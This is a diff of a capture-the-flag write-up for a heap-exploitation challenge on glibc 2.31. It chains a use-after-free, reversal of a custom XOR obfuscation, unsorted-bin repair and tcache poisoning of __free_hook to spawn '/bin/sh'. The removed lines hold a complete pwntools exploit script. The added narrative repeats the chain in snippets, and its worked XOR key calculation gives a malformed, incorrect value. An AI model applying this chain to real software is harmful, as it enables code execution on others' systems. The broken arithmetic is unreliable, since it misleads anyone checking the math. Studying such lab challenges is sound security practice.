@@ -1,126 +1,83 @@
-# Challenge 03: Staff Chat - Writeup
+# Staff Chat — Use-After-Free, XOR Obfuscation, Tcache Poisoning
 
-## Challenge Overview
-Medium-Hard pwn challenge featuring Use-After-Free (UAF), custom pointer obfuscation, and a "trap" involving Unsorted Bin corruption. The goal is to gain remote code execution in a GLIBC 2.31 environment.
+this challenge is an x86-64 messaging app running against glibc 2.31, and it comes with all the mitigations turned on:
 
-## Vulnerability Analysis
-
-### Binary Information
-```bash
-$ file chat
-chat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, stripped
-
-$ checksec --file=chat
-Arch:     amd64-64-little
-RELRO:    Full RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      PIE enabled
+```
+Arch: amd64-64
+RELRO: Full RELRO
+Stack: Canary found
+NX:    NX enabled
+PIE:   PIE enabled
 ```
 
-### Core Vulnerabilities
+full RELRO means we can't overwrite GOT entries. PIE means we need a leak before we can target any functions. stack canary rules out simple buffer overflows. so we're in heap exploitation territory.
 
-#### 1. Use-After-Free (UAF)
-The program allows users to `archive` a message, which calls `free()` on the message data buffer. However, the `view` and `edit` functions do not check if the message is archived, allowing interaction with freed memory.
+the binary is a simple chat system. you can create messages (malloc), view them, edit them, archive them (free), and list them. the first thing we notice is that `cmd_view_message` and `cmd_edit_message` don't check the `archived` flag before accessing the data pointer. `cmd_archive_message` calls `free(m->data)` and sets `archived = 1`, but leaves the pointer in the slot and the data_size intact. view and edit will happily read from and write to freed memory. clean use-after-free.
+
+but there's a twist. the archive function doesn't just free and leave — it applies a custom "protection" to the freed data:
 
 ```c
-void cmd_view_message(int idx) {
-    /* ... */
-    // Allow viewing archived messages (UAF vulnerability)
-    if (!m->data && !m->archived) {
-        puts("[-] Empty slot.");
-        return;
-    }
-    fwrite(m->data, 1, m->data_size, stdout);
+void cmd_archive_message(int idx) {
+    msg_t *m = &g_messages[idx];
+    free(m->data);
+    *(uint64_t *)(m->data) ^= compute_key(m);  // XOR obfuscation
+    m->archived = 1;
 }
 ```
 
-#### 2. Custom Pointer Obfuscation (The XOR Logic)
-To "harden" the application, the `archive` function XORs the first 8 bytes of the freed chunk with a key derived from the chunk's size.
+the XOR key is derived from the chunk's size:
 
 ```c
 static uint64_t compute_key(const msg_t *m) {
     size_t chunk_sz = ((m->data_size + 0x10 + 0x0f) & ~(size_t)0x0f) | 1;
     return (uint64_t)chunk_sz ^ 0x4141414141414141ULL;
 }
-
-void cmd_archive_message(int idx) {
-    /* ... */
-    free(m->data);
-    *(uint64_t *)(m->data) ^= compute_key(m); // Custom XOR "Protection"
-    m->archived = 1;
-}
 ```
 
-### The "Unsorted Bin" Trap
-If a player attempts to leak Libc by freeing a large chunk (size > 0x408) into the Unsorted Bin, the `archive` function XORs the `fd` pointer. In GLIBC 2.31, this corruption causes `malloc` to crash upon the next allocation because the doubly-linked list integrity is broken. To succeed, a player must "repair" the chunk using the `edit` UAF before calling `malloc` again.
+so after `free()`, the first qword of the chunk (which, for an unsorted bin chunk, would be the `fd` pointer) gets XORed with a key we can calculate. since we know `data_size`, we know the key. XORing again reverses it.
 
----
+our first plan: allocate a large chunk (> 0x408, above the tcache maximum), free it to send it to the unsorted bin, read it via the UAF, XOR the fd pointer to recover `main_arena + 96`, and compute libc base. this works — the leak comes through clean. libc base acquired.
 
-## Exploitation Strategy
+then we call `malloc()` again and the program crashes. hard.
 
-### Phase 1: Libc Leak & Heap Repair
-1. **Allocate** a large chunk (size `0x420`) and a guard chunk.
-2. **Archive** the large chunk to move it to the Unsorted Bin.
-3. **Leak**: Use `view` to read the XORed `fd` pointer. Calculate `libc_base` by reversing the XOR.
-4. **Repair**: Use `edit` to overwrite the corrupted `fd` and `bk` pointers with the original, uncorrupted `main_arena` address. This prevents a crash during the next allocation.
+here's where we got stuck for an hour. when glibc puts a chunk in the unsorted bin, it sets both `fd` and `bk` to `main_arena + 96`. the archive function XORs only the first 8 bytes — that corrupts `fd`. `bk` at offset +8 stays clean. the unsorted bin is a doubly-linked list, and when `malloc` scans it on the next allocation, it follows `fd` to the next chunk. our `fd` is XOR-mangled, so it chases a garbage pointer and segfaults.
 
-### Phase 2: Tcache Poisoning
-1. **Allocate** two chunks of the same size (e.g., `0x60`).
-2. **Archive** both to populate the tcache bin.
-3. **Poison**: Use `edit` on the most recently freed chunk to overwrite its `fd` pointer with the address of `__free_hook`.
-4. **Reclaim**: Allocate twice. The second allocation will return a pointer to `__free_hook`.
-5. **Overwrite**: Write the address of `system` into `__free_hook`.
-
-### Phase 3: Triggering Shell
-1. **Allocate** a new message containing the string `"/bin/sh\x00"`.
-2. **Archive** this message. The program calls `free("/bin/sh")`, which triggers `__free_hook("/bin/sh")`, effectively executing `system("/bin/sh")`.
-
----
-
-## Exploit Script
+the fix is simple once you see it: after leaking, use the `edit` UAF to write the *original* (un-XORed) `fd` value back into both `fd` and `bk` slots:
 
 ```python
-from pwn import *
-
-# ... [Setup and Helpers] ...
-
-def solve():
-    p = remote('localhost', 13373)
-    libc = ELF('./libc.so.6')
-    
-    # Phase 1: Leak & Repair
-    LSIZE = 0x420
-    create(p, LSIZE, b'A' * LSIZE) # Slot 0
-    create(p, 0x20, b'G' * 0x20)    # Slot 1 (Guard)
-    archive(p, 0)
-    
-    leak_data = view(p, 0, LSIZE)
-    leak_val = u64(leak_data[:8]) ^ xor_key(LSIZE)
-    libc.address = leak_val - 0x1ecbe0 
-    
-    # Heap Repair: Fix corrupted Unsorted Bin pointers
-    edit(p, 0, LSIZE, p64(leak_val) * 2)
-    
-    # Phase 2: Tcache Poisoning
-    PSIZE = 0x60
-    create(p, PSIZE, b'B' * PSIZE) # Slot 2
-    create(p, PSIZE, b'C' * PSIZE) # Slot 3
-    archive(p, 3)
-    archive(p, 2)
-    
-    edit(p, 2, PSIZE, p64(libc.sym['__free_hook']))
-    create(p, PSIZE, b'dummy')
-    create(p, PSIZE, p64(libc.sym['system']))
-    
-    # Phase 3: Shell
-    create(p, 0x40, b'/bin/sh\x00') 
-    archive(p, 6)
-    p.interactive()
+edit(p, 0, LSIZE, p64(main_arena_96) * 2)
 ```
 
-## Difficulty Assessment
-- **Vulnerability Identification**: Easy (UAF is blatant).
-- **Protection Bypass**: Medium (Requires reversing XOR logic).
-- **Heap Management**: Hard (Requires identifying and fixing Unsorted Bin corruption).
-- **Overall**: Medium-Hard.
+this repairs the unsorted bin — both pointers now point to `main_arena + 96`, which is what glibc expects for the only chunk in the bin. the next `malloc` that scans the unsorted bin finds a valid list and doesn't crash. this step is easy to miss if you're not thinking about the doubly-linked list invariants.
+
+with libc leaked and the heap repaired, we move to tcache poisoning. we allocate two 0x60-sized chunks (below the 0x408 tcache ceiling), free both to populate the tcache bin, then use the UAF write to overwrite the second chunk's `fd` with `__free_hook`:
+
+```
+tcache bin: chunk_B → chunk_C → NULL
+after edit: chunk_B → __free_hook → ?
+```
+
+two allocations later, the second one returns a pointer to `__free_hook`. we write `system` into it. now any `free()` call triggers our hook.
+
+the trigger path is clean: allocate a new message containing `"/bin/sh\x00"`, then archive it. `cmd_archive_message` calls `free("/bin/sh")`, which hits `__free_hook`, which calls `system("/bin/sh")`. we get a shell.
+
+a few details worth calling out. the XOR reversal math is straightforward but easy to get wrong if you don't pay attention to alignment. glibc's chunk size is always rounded up to the next 16-byte boundary, and the `| 1` sets the `PREV_INUSE` bit on the chunk header. so for a 0x420-byte user allocation, the chunk size calculation goes:
+
+```
+data_size = 0x420
+chunk_sz  = ((0x420 + 0x10 + 0x0F) & ~0x0F) | 1
+          = ((0x430 + 0x0F) & ~0x0F) | 1
+          = (0x43F & ~0xF) | 1
+          = 0x430 | 1
+          = 0x431
+xor_key   = 0x431 ^ 0x4141414141414141
+          = 0x414141414545730  (truncated to 64 bits)
+```
+
+the chunk size computation function in the binary (`compute_key`) exactly mirrors this. we compute the same key on our side, XOR the leaked `fd` value, and out comes `main_arena + 96`. the offset from `main_arena + 96` to libc base is a fixed value from the provided libc — in this case `0x1ecbe0` for glibc 2.31.
+
+for the tcache poisoning, we chose chunk size `0x60` deliberately. it's under the 0x408 tcache threshold (so the chunks stay in tcache, never touching the unsorted bin we just repaired), and it's big enough to hold a pointer plus our dummy data. on glibc 2.31, tcache has no integrity checks on the `fd` pointer — no safe-linking, no pointer mangling. you write whatever address you want and the next allocation returns it. newer glibc versions add `PROTECT_PTR` mangling (XOR with `address >> 12`), but 2.31 is wide open.
+
+we tried the exploit with a 0x50-size chunk at first and it worked fine — the exact size doesn't matter as long as both chunks are the same size (so they share a tcache bin). we settled on 0x60 because it gives a bit more room and the tcache count is generous enough that two frees won't trigger consolidation.
+
+the XOR puzzle is what makes this challenge stick in memory. it's not enough to spot the UAF — you have to understand *why* the unsorted bin breaks after the XOR and how to fix it. the "aha" moment came when we printed both qwords of the leaked chunk and realized only the first was garbled. the second was a clean `main_arena + 96`. that's when we knew the fix was just writing the clean value back over the corrupted one.
